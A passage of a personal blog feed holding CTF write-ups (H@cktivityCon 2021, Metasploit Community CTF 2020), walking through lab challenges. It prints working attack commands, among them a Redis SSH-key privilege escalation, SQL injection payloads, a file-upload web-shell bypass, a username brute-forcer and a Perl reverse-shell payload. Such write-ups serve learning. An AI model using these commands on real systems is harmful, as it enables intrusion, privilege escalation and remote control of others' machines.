&lt;p>I was to solve phished and get &lt;strong>first blood&lt;/strong> but I followed John Hammond&amp;rsquo;s video on a previous ctf that solved this similar challenge so I&amp;rsquo;ll just link it
as the explanation is good enough. Only difference is I used &lt;a href="https://gchq.github.io/CyberChef/" target="_blank" rel="noopener">cyberchef&lt;/a>
for find and replace to clean up the output
from the xls instead of an editor.&lt;/p>
&lt;p>&lt;a href="https://youtu.be/QgHhgwKL79Q" target="_blank" rel="noopener">https://youtu.be/QgHhgwKL79Q&lt;/a>
&lt;/p>
&lt;p>&lt;a href="https://twitter.com/trevorsaudi" target="_blank" rel="noopener">@trevorsaudi&lt;/a>
also shows how to solve this in his writeup.&lt;/p>
&lt;pre tabindex="0">&lt;code>https://trevorsaudi.medium.com/africahackon-2021-ctf-finals-8111f8edc408
&lt;/code>&lt;/pre>&lt;h2 id="conclusion">Conclusion&lt;/h2>
&lt;p>Thanks to &lt;a href="https://twitter.com/AfricaHackon" target="_blank" rel="noopener">@AfricaHackon&lt;/a>
and the partners for the CTF, we don&amp;rsquo;t get to play many locally organised ctfs so this was good to compete against local teams.&lt;/p>
&lt;p>You can still play the challenges by visiting this link &lt;a href="https://ctfroom.com/vaults/" target="_blank" rel="noopener">https://ctfroom.com/vaults/&lt;/a>
&lt;/p></content></item><item><title>H@cktivityCon 2021 CTF Writeup</title><link>https://blog.ikuamike.io/posts/2021/hacktivitycon-2021-ctf/</link><pubDate>Sat, 18 Sep 2021 00:00:00 +0000</pubDate><guid>https://blog.ikuamike.io/posts/2021/hacktivitycon-2021-ctf/</guid><description/><content>&lt;img src="https://blog.ikuamike.io/img/hacktivitycon-2021/hacktivity.jpeg" class="center" style="border-radius: 8px;" />
&lt;h2 id="introduction">Introduction&lt;/h2>
&lt;p>H@cktivityCon 2021 was happening over the weekend and I participated in their ctf with team &lt;a href="https://twitter.com/fr334aks" target="_blank" rel="noopener">@fr334aks&lt;/a>
. We managed position 49 out of 2527 teams.
This writeup is of the challenges I managed to solve.&lt;/p>
&lt;h2 id="challenges">Challenges&lt;/h2>
&lt;h3 id="1-mobile-to-do">1. Mobile: To Do&lt;/h3>
&lt;p>Challenge Description:&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/hacktivitycon-2021/to-do-1.png" class="center" style="border-radius: 8px;" />
&lt;p>We are provided with an apk file. First thing I typically do with apk files is open them with jadx-gui.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>jadx-gui todo.apk
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Here I first look at the AndroidManifest.xml to see the application entry point.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/hacktivitycon-2021/to-do-2.png" class="center" style="border-radius: 8px;" />
&lt;p>For this app it&amp;rsquo;s LoginActivity. It checks if the input provided is equal to &lt;code>testtest&lt;/code> and if true it goes on to load MainActivity.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/hacktivitycon-2021/to-do-3.png" class="center" style="border-radius: 8px;" />
&lt;p>When we install the application and supply the password as &lt;code>testtest&lt;/code> we get the flag.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/hacktivitycon-2021/to-do-5.png" class="center" style="border-radius: 8px;" />
&lt;img src="https://blog.ikuamike.io/img/hacktivitycon-2021/to-do-6.png" class="center" style="border-radius: 8px;" />
&lt;p>Unfortunately I couldn&amp;rsquo;t copy it out and typing it would have been a pain. Back on the MainActivity we see it loads MyDatabase.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/hacktivitycon-2021/to-do-4.png" class="center" style="border-radius: 8px;" />
&lt;p>When we look at MyDatabase, it loads an sqlite database &lt;code>todos.db&lt;/code>. A lot of the times sqlitedb database in android apps are stored within
the apk.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/hacktivitycon-2021/to-do-7.png" class="center" style="border-radius: 8px;" />
&lt;p>Extracting the apk using apktool I was able to access the sqlitedb and extract the flag.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/hacktivitycon-2021/to-do-8.png" class="center" style="border-radius: 8px;" />
&lt;h3 id="2-miscellaneous-shelle">2. Miscellaneous: Shelle&lt;/h3>
&lt;p>Challenge Description:&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/hacktivitycon-2021/shelle-1.png" class="center" style="border-radius: 8px;" />
&lt;p>When we connect to the challenge, we get access to a restricted shell with only a few commands we can run.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/hacktivitycon-2021/shelle-2.png" class="center" style="border-radius: 8px;" />
&lt;p>When we read the assignment, we are told the flag is in the /opt directory.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/hacktivitycon-2021/shelle-3.png" class="center" style="border-radius: 8px;" />
&lt;p>Unfortunately we can&amp;rsquo;t access it.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/hacktivitycon-2021/shelle-4.png" class="center" style="border-radius: 8px;" />
&lt;p>Next I tried to see if we can access any environment variables and see if the &lt;code>$&lt;/code> character is forbidden as well.
Luckily this works.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/hacktivitycon-2021/shelle-5.png" class="center" style="border-radius: 8px;" />
&lt;p>I then ran &lt;code>set&lt;/code> to list all environment variables. Looking through the list I saw one set to bash.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/hacktivitycon-2021/shelle-6.png" class="center" style="border-radius: 8px;" />
&lt;p>I was able to use it to escape the restricted shell and read the flag.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/hacktivitycon-2021/shelle-7.png" class="center" style="border-radius: 8px;" />
&lt;h3 id="3-miscellaneous-redlike">3. Miscellaneous: Redlike&lt;/h3>
&lt;p>Challenge Description:&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/hacktivitycon-2021/redlike-1.png" class="center" style="border-radius: 8px;" />
&lt;p>After sshing into the challenge machine, I performed some local enumeration and when checking for running processes
we see redis running locally as root. Clearly this is the privesc path.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/hacktivitycon-2021/redlike-2.png" class="center" style="border-radius: 8px;" />
&lt;p>I immediately jumped to &lt;a href="https://book.hacktricks.xyz/pentesting/6379-pentesting-redis#ssh" target="_blank" rel="noopener">hacktricks&lt;/a>
and used the below commands to escalate privileges.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>ssh-keygen -f redis
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">(&lt;/span>echo -e &lt;span style="color:#e6db74">&amp;#34;\n\n&amp;#34;&lt;/span>; cat redis.pub; echo -e &lt;span style="color:#e6db74">&amp;#34;\n\n&amp;#34;&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &amp;gt; spaced_key.txt
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>cat spaced_key.txt | redis-cli -h 127.0.0.1 -x set ssh_key
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>redis-cli -h 127.0.0.1
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>config set dir /root/.ssh
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>config set dbfilename &lt;span style="color:#e6db74">&amp;#34;authorized_keys&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>save
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>chmod &lt;span style="color:#ae81ff">600&lt;/span> redis
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ssh -i redis root@127.0.0.1
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>
&lt;img src="https://blog.ikuamike.io/img/hacktivitycon-2021/redlike-3.png" class="center" style="border-radius: 8px;" />
&lt;h3 id="4-miscellaneous-race-car">4. Miscellaneous: Race Car&lt;/h3>
&lt;p>Challenge Description:&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/hacktivitycon-2021/racecar-1.png" class="center" style="border-radius: 8px;" />
&lt;p>I enjoyed this one as I was the second to solve it.&lt;/p>
&lt;p>When we ssh into the challenge machine, the session is immediately closed when we provide the password.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/hacktivitycon-2021/racecar-2.png" class="center" style="border-radius: 8px;" />
&lt;p>I tried different techniques I knew for restricted shell bypass with ssh but none worked. I got an idea to use sftp and
see what configuration files could be causing this behaviour.&lt;/p>
&lt;p>With sftp we are not kicked out and can look at files. Two files seem to be of interest but only &lt;code>rc&lt;/code> in .ssh has contents.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/hacktivitycon-2021/racecar-3.png" class="center" style="border-radius: 8px;" />
&lt;p>The rc file is the one responsible for getting us kicked out. I tried deleting it but that didn&amp;rsquo;t work. However, since we have write
permissions, I was able to overwrite it by uploading an empty file with the same name.&lt;/p>
&lt;p>Once that was done we can ssh and get the flag.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/hacktivitycon-2021/racecar-4.png" class="center" style="border-radius: 8px;" />
&lt;h2 id="conclusion">Conclusion&lt;/h2>
&lt;p>Thanks HackerOne, John Hammond and the CTF challenge creators, it was a fun one!&lt;/p></content></item><item><title>Metasploit Community CTF December 2020 WriteUp</title><link>https://blog.ikuamike.io/posts/2020/metasploitctf2020/</link><pubDate>Mon, 07 Dec 2020 00:00:00 +0000</pubDate><guid>https://blog.ikuamike.io/posts/2020/metasploitctf2020/</guid><description/><content>&lt;h1 id="summary">Summary&lt;/h1>
&lt;p>Over the weekend I participated in &lt;a href="https://ctftime.org/event/1200" target="_blank" rel="noopener">Metasploit Community December CTF&lt;/a>
by Rapid7
with team &lt;a href="https://twitter.com/fr334aks" target="_blank" rel="noopener">fr334aks&lt;/a>
. We ended up getting position 57/413. The CTF was meant to be beginner-friendly.&lt;/p>
&lt;h2 id="intro">Intro&lt;/h2>
&lt;p>Teams are provided with their own instance of a kali box which is public facing to act as a jump host to reach
an ubuntu VM which hosts the challenges.&lt;/p>
&lt;p>On the ubuntu VM there are 20 open ports for each challenge. To complete a challenge you need to find a challenge
flag and submit the MD5 checksum of the PNG to get points.&lt;/p>
&lt;p>I decided to tunnel all connections to the victim through ssh with sshuttle using the below command:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>sshuttle -r kali@52.90.96.4 -e &lt;span style="color:#e6db74">&amp;#34;ssh -i metasploit_ctf_kali_ssh_key.pem&amp;#34;&lt;/span> 172.15.18.101/32
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="challenges">Challenges:&lt;/h2>
&lt;h3 id="4-of-hearts">4 of Hearts&lt;/h3>
&lt;p>After tunneling the connections to the Ubuntu VM the first flag is on port 80, &lt;code>http://172.15.18.101/4_of_hearts.png&lt;/code>.&lt;/p>
&lt;p>&lt;strong>Flag&lt;/strong>:&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/metasploitctf2020/4_of_hearts.png" alt="metasploit_ctf_2020" class="center" style="border-radius: 8px;" />
&lt;h3 id="6-of-hearts">6 of Hearts&lt;/h3>
&lt;img src="https://blog.ikuamike.io/img/metasploitctf2020/port6868.png" alt="metasploit_ctf_2020" class="center" style="border-radius: 8px;" />
&lt;p>There is a photos website running on port 6868. There is a functionality to sign up that creates directories based on a user&amp;rsquo;s
initials of their names.&lt;/p>
&lt;p>On signing up we first get the notes directory.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/metasploitctf2020/port6868_1.png" alt="metasploit_ctf_2020" class="center" style="border-radius: 8px;" />
&lt;p>On the home page, there are images which are hosted under files directory with different users initials.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/metasploitctf2020/port6868_2.png" alt="metasploit_ctf_2020" class="center" style="border-radius: 8px;" />
&lt;p>Since there&amp;rsquo;s no authentication we can try look at notes for each of the discovered users.&lt;/p>
&lt;p>&lt;strong>BD&lt;/strong>:&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/metasploitctf2020/port6868_4.png" alt="metasploit_ctf_2020" class="center" style="border-radius: 8px;" />
&lt;p>&lt;strong>TW&lt;/strong>:&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/metasploitctf2020/port6868_5.png" alt="metasploit_ctf_2020" class="center" style="border-radius: 8px;" />
&lt;p>&lt;strong>MC&lt;/strong>:&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/metasploitctf2020/port6868_6.png" alt="metasploit_ctf_2020" class="center" style="border-radius: 8px;" />
&lt;p>From the above notes we can tell that there&amp;rsquo;s a site admin whose name is &lt;em>Beth Ulysses Denise Donnoly Yager&lt;/em>, this creates the initials
&lt;em>BUDDY&lt;/em>.&lt;/p>
&lt;p>We can then get the flag with these initials at the url &lt;code>http://172.15.18.101:6868/files/BUDDY/2&lt;/code>.&lt;/p>
&lt;p>&lt;strong>Flag&lt;/strong>:&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/metasploitctf2020/6_of_hearts.png" alt="metasploit_ctf_2020" class="center" style="border-radius: 8px;" />
&lt;h3 id="3-of-spades">3 of Spades&lt;/h3>
&lt;p>To solve this one we are required to identify a valid username aside from guest. When you submit guest which is a valid username, the
request takes about 5 seconds to complete but if you supply a non-valid username it takes less than a second. The password doesn&amp;rsquo;t
matter.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/metasploitctf2020/port8080.png" alt="metasploit_ctf_2020" class="center" style="border-radius: 8px;" />
&lt;p>I created a python script to bruteforce the username with a wordlist:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-py" data-lang="py">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> requests
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>url &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;http://172.15.18.101:8080/login.php&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>user &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;guest&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>f &lt;span style="color:#f92672">=&lt;/span> open(&lt;span style="color:#e6db74">&amp;#39;/usr/share/seclists/Usernames/cirt-default-usernames.txt&amp;#39;&lt;/span>,&lt;span style="color:#e6db74">&amp;#39;r&amp;#39;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>users &lt;span style="color:#f92672">=&lt;/span> f&lt;span style="color:#f92672">.&lt;/span>readlines()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>f&lt;span style="color:#f92672">.&lt;/span>close()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">guess&lt;/span>(username):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print(&lt;span style="color:#e6db74">&amp;#34;Testing username: &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> username &lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#e6db74">&amp;#34;...&amp;#34;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> data &lt;span style="color:#f92672">=&lt;/span> {&lt;span style="color:#e6db74">&amp;#34;username&amp;#34;&lt;/span>:username,&lt;span style="color:#e6db74">&amp;#34;password&amp;#34;&lt;/span>:&lt;span style="color:#e6db74">&amp;#34;test&amp;#34;&lt;/span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> r &lt;span style="color:#f92672">=&lt;/span> requests&lt;span style="color:#f92672">.&lt;/span>post(url, data&lt;span style="color:#f92672">=&lt;/span>data)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> response_time &lt;span style="color:#f92672">=&lt;/span> r&lt;span style="color:#f92672">.&lt;/span>elapsed&lt;span style="color:#f92672">.&lt;/span>total_seconds()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> response_time &lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">4&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print(&lt;span style="color:#e6db74">&amp;#34;Valid user found: &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> username)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> exit()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">for&lt;/span> i &lt;span style="color:#f92672">in&lt;/span> users:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> guess(i&lt;span style="color:#f92672">.&lt;/span>strip())
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>It found the user to be demo:&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/metasploitctf2020/port8080_2.png" alt="metasploit_ctf_2020" class="center" style="border-radius: 8px;" />
&lt;p>When we submit it we get the url to the flag,&lt;/p>
&lt;pre tabindex="0">&lt;code>http://172.15.18.101:8080/a3lk3d939d993201ld.png
&lt;/code>&lt;/pre>
&lt;img src="https://blog.ikuamike.io/img/metasploitctf2020/port8080_1.png" alt="metasploit_ctf_2020" class="center" style="border-radius: 8px;" />
&lt;p>&lt;strong>Flag&lt;/strong>:&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/metasploitctf2020/3_of_spades.png" alt="metasploit_ctf_2020" class="center" style="border-radius: 8px;" />
&lt;h3 id="2-of-spades">2 of Spades&lt;/h3>
&lt;p>There&amp;rsquo;s a website with the ability to search for reviews on port 9001.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/metasploitctf2020/port9001.png" alt="metasploit_ctf_2020" class="center" style="border-radius: 8px;" />
&lt;p>First thing to check with search functionality is SQLi, after adding a quote &lt;code>'&lt;/code> we get a sqlite3 error confirming presence of sqli:&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/metasploitctf2020/port9001_1.png" alt="metasploit_ctf_2020" class="center" style="border-radius: 8px;" />
&lt;p>Using this payload we can get the structure of the db:&lt;/p>
&lt;pre tabindex="0">&lt;code>overwatch&amp;#39; union select 1,sql,3 FROM sqlite_master;-- -
&lt;/code>&lt;/pre>
&lt;img src="https://blog.ikuamike.io/img/metasploitctf2020/port9001_2.png" alt="metasploit_ctf_2020" class="center" style="border-radius: 8px;" />
&lt;p>Then we can extract the link to the flag with this payload:&lt;/p>
&lt;pre tabindex="0">&lt;code>overwatch&amp;#39; union select 1,flag,link FROM hidden-- -
&lt;/code>&lt;/pre>
&lt;img src="https://blog.ikuamike.io/img/metasploitctf2020/port9001_3.png" alt="metasploit_ctf_2020" class="center" style="border-radius: 8px;" />
&lt;p>&lt;strong>Flag&lt;/strong>:&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/metasploitctf2020/2_of_spades.png" alt="metasploit_ctf_2020" class="center" style="border-radius: 8px;" />
&lt;h3 id="8-of-hearts">8 of Hearts&lt;/h3>
&lt;p>On port 4545, We are provided with 2 files:&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/metasploitctf2020/port4545.png" alt="metasploit_ctf_2020" class="center" style="border-radius: 8px;" />
&lt;p>When you run the elf binary it asks for buffalo and if you give one it asks for more.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/metasploitctf2020/port4545_1.png" alt="metasploit_ctf_2020" class="center" style="border-radius: 8px;" />
&lt;p>All we needed to do was guess how many buffaloes it needed, the exact value was between 100 and 200.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/metasploitctf2020/port4545_2.png" alt="metasploit_ctf_2020" class="center" style="border-radius: 8px;" />
&lt;p>&lt;strong>Flag&lt;/strong>:&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/metasploitctf2020/8_of_hearts.png" alt="metasploit_ctf_2020" class="center" style="border-radius: 8px;" />
&lt;h3 id="8-of-spades">8 of Spades&lt;/h3>
&lt;p>On port 1080 a socks5 proxy is running on this port without any authentication. We can edit &lt;code>/etc/proxychains.conf&lt;/code> and add this server as a socks5
proxy server.&lt;/p>
&lt;pre tabindex="0">&lt;code>socks5 172.15.18.101 1080
&lt;/code>&lt;/pre>&lt;p>Next we need to discover open ports that we can access through the proxy. Port scanning over a proxy can be really slow, therefore, lets
check the top 100 ports first.&lt;/p>
&lt;pre tabindex="0">&lt;code>proxychains nmap -sT --top-ports=100 127.0.0.1
&lt;/code>&lt;/pre>&lt;p>Nmap discovers port 22 and 8000 open.&lt;/p>
&lt;p>Port 8000 is a web server hosting our flag:&lt;/p>
&lt;pre tabindex="0">&lt;code>proxychains curl 127.0.0.1:8000
&lt;/code>&lt;/pre>
&lt;img src="https://blog.ikuamike.io/img/metasploitctf2020/port1080.png" alt="metasploit_ctf_2020" class="center" style="border-radius: 8px;" />
&lt;p>&lt;strong>Flag&lt;/strong>:&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/metasploitctf2020/8_of_spades.png" alt="metasploit_ctf_2020" class="center" style="border-radius: 8px;" />
&lt;h3 id="red-joker">Red Joker&lt;/h3>
&lt;p>On port 9007, we get a zip file.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/metasploitctf2020/port9007.png" alt="metasploit_ctf_2020" class="center" style="border-radius: 8px;" />
&lt;p>Only thing needed is to extract it:&lt;/p>
&lt;pre tabindex="0">&lt;code>7z x red_joker.zip
&lt;/code>&lt;/pre>&lt;p>&lt;strong>Flag&lt;/strong>:&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/metasploitctf2020/joker_red.png" alt="metasploit_ctf_2020" class="center" style="border-radius: 8px;" />
&lt;h3 id="6-of-diamonds">6 of Diamonds&lt;/h3>
&lt;p>On port 8200, there&amp;rsquo;s a website that we can upload images.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/metasploitctf2020/port8200.png" alt="metasploit_ctf_2020" class="center" style="border-radius: 8px;" />
&lt;p>It only allows jpeg and png files by checking mime type and file extension. We can bypass this restriction with a few tricks.&lt;/p>
&lt;p>We can create a php file with a valid jpeg mime type with this command:&lt;/p>
&lt;pre tabindex="0">&lt;code>echo -n -e &amp;#39;\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01&amp;#39; &amp;gt; shell.php
&lt;/code>&lt;/pre>
&lt;img src="https://blog.ikuamike.io/img/metasploitctf2020/port8200_3.png" alt="metasploit_ctf_2020" class="center" style="border-radius: 8px;" />
&lt;p>Then we can intercept the request in burp suite and change the extension and add our php exploit code.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/metasploitctf2020/port8200_2.png" alt="metasploit_ctf_2020" class="center" style="border-radius: 8px;" />
&lt;p>We can successfully execute commands and get the location of the flag.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/metasploitctf2020/port8200_4.png" alt="metasploit_ctf_2020" class="center" style="border-radius: 8px;" />
&lt;p>Flag was found at &lt;code>http://172.15.18.101:8200/157a7640-0fa4-11eb-adc1-0242ac120002/6_of_diamonds.png&lt;/code>.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/metasploitctf2020/6_of_diamonds.png" alt="metasploit_ctf_2020" class="center" style="border-radius: 8px;" />
&lt;h3 id="queen-of-spades">Queen of Spades&lt;/h3>
&lt;p>On port 8202, we have another website with barely any functionality to interact with.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/metasploitctf2020/port8202.png" alt="metasploit_ctf_2020" class="center" style="border-radius: 8px;" />
&lt;p>But when we look at burp where we are proxying http traffic, there is some communication to an api which looks very much like
graphql.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/metasploitctf2020/port8202_1.png" alt="metasploit_ctf_2020" class="center" style="border-radius: 8px;" />
&lt;p>A common misconfiguration to check is if introspection is enabled on the endpoint.&lt;/p>
&lt;p>When we supply an introspection payload (you can use the ones from &lt;a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/GraphQL%20Injection#enumerate-database-schema-via-introspection" target="_blank" rel="noopener">payloadallthethings repo&lt;/a>
) it works and we get the schema.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/metasploitctf2020/port8202_3.png" alt="metasploit_ctf_2020" class="center" style="border-radius: 8px;" />
&lt;p>To understand the result, we can easily visualize this at &lt;a href="https://apis.guru/graphql-voyager/" target="_blank" rel="noopener">https://apis.guru/graphql-voyager/&lt;/a>
&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/metasploitctf2020/port8202_2.png" alt="metasploit_ctf_2020" class="center" style="border-radius: 8px;" />
&lt;p>With this structure we can easily make our queries.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/metasploitctf2020/port8202_4.png" alt="metasploit_ctf_2020" class="center" style="border-radius: 8px;" />
&lt;p>The below query gives the location of the flag.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/metasploitctf2020/port8202_5.png" alt="metasploit_ctf_2020" class="center" style="border-radius: 8px;" />
&lt;p>&lt;strong>Flag&lt;/strong>:&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/metasploitctf2020/queen_of_spades.png" alt="metasploit_ctf_2020" class="center" style="border-radius: 8px;" />
&lt;h3 id="2-of-hearts">2 of Hearts&lt;/h3>
&lt;p>On port 9000, there&amp;rsquo;s another website similar to the one port 9001 but this one has a different way in which it handles searches. When we search using
just a single character a, the first result is interesting as it looks like a folder in a terminal.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/metasploitctf2020/port9000.png" alt="metasploit_ctf_2020" class="center" style="border-radius: 8px;" />
&lt;p>This could mean our input is being used to construct a shell command. We can try getting a reverse shell using this reverse shell payload:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-perl" data-lang="perl">&lt;span style="display:flex;">&lt;span>$&lt;span style="color:#960050;background-color:#1e0010">(&lt;/span>perl &lt;span style="color:#f92672">-&lt;/span>e &lt;span style="color:#e6db74">&amp;#39;use Socket;$i=&amp;#34;172.15.18.100&amp;#34;;$p=9000;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&amp;#34;tcp&amp;#34;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&amp;#34;&amp;gt;&amp;amp;S&amp;#34;);open(STDOUT,&amp;#34;&amp;gt;&amp;amp;S&amp;#34;);open(STDERR,&amp;#34;&amp;gt;&amp;amp;S&amp;#34;);exec(&amp;#34;/bin/sh -i&amp;#34;);};&amp;#39;&lt;/span>)
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>We successfully get a reverse shell.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/metasploitctf2020/port9000_1.png" alt="metasploit_ctf_2020" class="center" style="border-radius: 8px;" />
&lt;p>The vulnerable code is using the find command:&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/metasploitctf2020/port9000_2.png" alt="metasploit_ctf_2020" class="center" style="border-radius: 8px;" />
&lt;p>&lt;strong>Flag&lt;/strong>:&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/metasploitctf2020/2_of_hearts.png" alt="metasploit_ctf_2020" class="center" style="border-radius: 8px;" />
&lt;h3 id="black-joker">Black Joker&lt;/h3>
&lt;img src="https://blog.ikuamike.io/img/metasploitctf2020/port8123.png" alt="metasploit_ctf_2020" class="center" style="border-radius: 8px;" />
&lt;p>The web app here has two visible functionalities:&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/metasploitctf2020/port8123_2.png" alt="metasploit_ctf_2020" class="center" style="border-radius: 8px;" />
&lt;p>When we try to sign up, we get the response that no new members can signup. When trying to look at the request in burp suite, there was
none. Therefore it must be a frontend response.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/metasploitctf2020/port8123_1.png" alt="metasploit_ctf_2020" class="center" style="border-radius: 8px;" />
&lt;p>sign-up.js:&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/metasploitctf2020/port8123_3.png" alt="metasploit_ctf_2020" class="center" style="border-radius: 8px;" />
&lt;p>Looking at the forgotten your password functionality, we can supply an email. The home page contains this email: &lt;a href="mailto:admin@example.com">admin@example.com&lt;/a>
.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/metasploitctf2020/port8123_4.png" alt="metasploit_ctf_2020" class="center" style="border-radius: 8px;" />
&lt;p>This gets us a hint but it&amp;rsquo;s not enough information. When we look at the full request in burp, there was actually more information
